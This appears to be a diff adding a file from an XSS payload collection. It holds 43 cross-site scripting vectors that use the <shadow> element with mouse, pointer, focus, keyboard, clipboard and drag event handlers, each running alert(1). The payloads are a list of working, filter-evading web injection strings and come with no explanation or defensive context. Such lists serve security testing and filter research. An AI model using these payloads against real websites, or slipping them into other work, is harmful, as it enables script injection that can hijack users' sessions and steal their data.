@@ -1,0 +1,43 @@
+<shadow draggable="true" ondrag="alert(1)">test</shadow>
+<shadow draggable="true" ondragend="alert(1)">test</shadow>
+<shadow draggable="true" ondragenter="alert(1)">test</shadow>
+<shadow draggable="true" ondragleave="alert(1)">test</shadow>
+<shadow draggable="true" ondragstart="alert(1)">test</shadow>
+<shadow id=x tabindex=1 onactivate=alert(1)></shadow>
+<shadow id=x tabindex=1 onbeforeactivate=alert(1)></shadow>
+<shadow id=x tabindex=1 onbeforedeactivate=alert(1)></shadow><input autofocus>
+<shadow id=x tabindex=1 ondeactivate=alert(1)></shadow><input id=y autofocus>
+<shadow id=x tabindex=1 onfocus=alert(1)></shadow>
+<shadow id=x tabindex=1 onfocusin=alert(1)></shadow>
+<shadow onafterscriptexecute=alert(1)><script>1</script>
+<shadow onbeforecopy="alert(1)" contenteditable>test</shadow>
+<shadow onbeforecut="alert(1)" contenteditable>test</shadow>
+<shadow onbeforepaste="alert(1)" contenteditable>test</shadow>
+<shadow onbeforescriptexecute=alert(1)><script>1</script>
+<shadow onblur=alert(1) tabindex=1 id=x></shadow><input autofocus>
+<shadow onclick="alert(1)">test</shadow>
+<shadow oncontextmenu="alert(1)">test</shadow>
+<shadow oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<shadow oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<shadow ondblclick="alert(1)" autofocus tabindex=1>test</shadow>
+<shadow onfocusout=alert(1) tabindex=1 id=x></shadow><input autofocus>
+<shadow onkeydown="alert(1)" contenteditable>test</shadow>
+<shadow onkeypress="alert(1)" contenteditable>test</shadow>
+<shadow onkeyup="alert(1)" contenteditable>test</shadow>
+<shadow onmousedown="alert(1)">test</shadow>
+<shadow onmouseenter="alert(1)">test</shadow>
+<shadow onmouseleave="alert(1)">test</shadow>
+<shadow onmousemove="alert(1)">test</shadow>
+<shadow onmouseout="alert(1)">test</shadow>
+<shadow onmouseover="alert(1)">test</shadow>
+<shadow onmouseup="alert(1)">test</shadow>
+<shadow onmousewheel=alert(1)>requires scrolling
+<shadow onpaste="alert(1)" contenteditable>test</shadow>
+<shadow onpointerdown=alert(1)>XSS</shadow>
+<shadow onpointerenter=alert(1)>XSS</shadow>
+<shadow onpointerleave=alert(1)>XSS</shadow>
+<shadow onpointermove=alert(1)>XSS</shadow>
+<shadow onpointerout=alert(1)>XSS</shadow>
+<shadow onpointerover=alert(1)>XSS</shadow>
+<shadow onpointerrawupdate=alert(1)>XSS</shadow>
+<shadow onpointerup=alert(1)>XSS</shadow>
